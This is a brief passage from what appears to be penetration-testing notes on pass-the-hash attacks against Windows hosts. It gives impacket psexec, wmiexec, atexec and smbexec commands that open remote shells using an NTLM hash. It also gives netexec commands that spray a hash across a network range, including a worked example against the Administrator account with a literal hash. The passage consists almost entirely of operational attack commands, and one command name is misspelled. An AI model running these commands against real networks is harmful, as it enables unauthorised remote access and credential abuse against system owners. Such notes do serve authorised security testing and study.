-- -
### Impacket
Use impacket tools to get a shell. The commands all run the same so just change the binary name and keep everything else the same. 
```bash
impacket-psexec <user>@<ip> -hashes :<hash>
impackket-wmiexec <user>@<ip> -hashes :<hash>
impacket-atexec <user>@<ip> -hashes :<hash>
impacket-smbexec <user>@<ip> -hashes :<hash>
```
### netexec
```bash
# password hash spaying
netexec smb <CIDR range> -u <user> -d <domain> -H <hash> 
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# password hash spraying for local account only, not AD
netexec smb <CDIR range> -u <user> -d <domain> -H <hash> --local-auth
```